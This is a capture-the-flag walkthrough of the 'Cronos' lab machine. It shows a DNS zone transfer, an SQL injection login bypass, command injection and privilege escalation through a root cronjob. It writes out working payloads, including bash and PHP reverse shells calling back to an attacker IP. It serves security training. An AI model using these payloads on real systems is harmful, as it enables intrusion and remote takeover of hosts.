# Cronos

# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```bash
export IP=10.10.10.13
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled.png)

The Ports that are open are:

- 22: ssh; OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
- 53: domain; ISC BIND 9.10.3-P4 (Ubuntu Linux)
- 80: http; Apache httpd 2.4.18 ((Ubuntu))

## Full Results

Further scanning showed no other available ports

# Enumeration (Service Version Check)

Firstly, as port 80 is open, we should try to visit the website at the IP address:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%201.png)

As we can see, it is simply a default Apache2 page. Looking at the feroxbuster results that are run with Autorecon, we see no useful results either. 

When shown a default ubuntu page like this with no pages available like this, it could imply that there is a configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site.

To resolve this issue, we have to:

1. Figure out the hostname(s) that the given IP address resolves to 
2. Add those resolutions to the /etc/hosts file

To accomplish the first task, we can try to change our default dns server first using the command:

```bash
nslookup
```

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%202.png)

We then key in "server" + the IP address we have: 

```bash
server 10.10.10.13
```

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%203.png)

From there, we simply key in the ip address again to try a resolution using the new DNS server:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%204.png)

From these, we see that we have a nameserver, and our domain name is "cronos.htb"

Now to accomplish the second task of adding resolutions, we can simply run the command:

```bash
echo "10.10.10.13 cronos.htb" >> /etc/hosts
```

Now if we try to visit the url "http://cronos.htb":

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%205.png)

We have the webpage displayed and the url resolves to 10.10.10.13. However, all the links on the page seem to link to various legitimate websites and do not seem to be linked to this challenge.

To further enumerate the website, we can try to perform a zone transfer request to find other hostnames on the domain. We can do so using the command:

```bash
dig axfr cronos.htb @10.10.10.13
```

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%206.png)

This gives us:

- admin.cronos.htb
- www.cronos.htb

We can add these hostnames to the /etc/hosts file by editing it:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%207.png)

And now if we visit the page www.cronos.htb, it shows us the same main page as before:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%208.png)

But if we visit admin.cronos.htb:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%209.png)

We see a log in page that we can try to break into.

# Initial Foothold

To authenticate, I first tried common credentials such as "admin:admin", "admin:password", "cronos:cronos" and "admin:cronos", but they were all invalid.

I then tried to use sql injections, using payloads such as:

```bash
' or 1=1#
```

And we got in to [http://admin.cronos.htb/welcome.php](http://admin.cronos.htb/welcome.php):

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2010.png)

This page allows us to perform tracert or ping to an IP address on the surface. As these are commands on a cli, we can attempt to execute command injection by running it with a payload of:

```bash
8.8.8.8 & whoami
```

This payload converts to tracert 8.8.8.8 & whoami, which runs the tracert in the background while running the whoami command. This gives us: 

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2011.png)

And this indicates that it is indeed vulnerable to command injection. To spawn a shell using this interface, we first start a netcat listener using:

```bash
nc -nvlp 4444
```

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2012.png)

And we then use Burp to intercept the payload:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2013.png)

We can see that the command and hosts are sent as parameters of the request and from command injection we know that this is likely run from the command line as it is. Therefore we can send the request to repeater and change the parameters to: 

```bash
command=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.17.90/4444+0>%261'%26host=
```

When we send the request, we see that we have shell on our listener:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2014.png)

To upgrade from our restricted shell, we first run:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2015.png)

This gives us a partially interactive shell. 

To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```bash
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2016.png)

With that done, we have shell:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2017.png)

# User Flag

To get the user flag, we can cd to the home directory and use the find command:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2018.png)

# Root Flag

To escalate privileges, I first go to my local LinEnum directory and spawn a http server:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2019.png)

Then, I use wget to save the file onto the target machine:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2020.png)

From there i give it run permissions and run the script:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2021.png)

If we look at crontab, we see the last line where root is running a cronjob consistently. 

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2022.png)

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2023.png)

If we look at the permissions for artisan, we see that we are the owner of the file and we have rwx permissions:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2024.png)

To get artisan to spawn a shell, we can first set up another listener:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2025.png)

And then we can add these two lines to the start of the file:

```bash
$sock=fsockopen("10.10.17.90", 4445);
exec("/bin/sh -i <&3 >&3 2>&3");
```

Then we can wait on our listener for a root but limited shell:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2026.png)

After the same shell upgrade process, we have a fully interactive root shell:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2027.png)

From here, we can simply cd to root and use the find command to get the root flag:

![Untitled](Cronos%20ba0eec374310446694a6b59047f66a60/Untitled%2028.png)

# Learning Points (Additional Points)

- When only the default apache2 server page is shown and no pages available, might be a DNS mapping issue where we the IP address might not know what hostname it should be mapped into
    - Figure out the hostname(s) that the given IP address resolves to
        - nslookup and Zone Xfer requests
    - Add those entries in the /etc/hosts file
- For sql injections, especially those over the web, try to use "--+" instead of just "--" to append a space after it to make it a legitimate comment
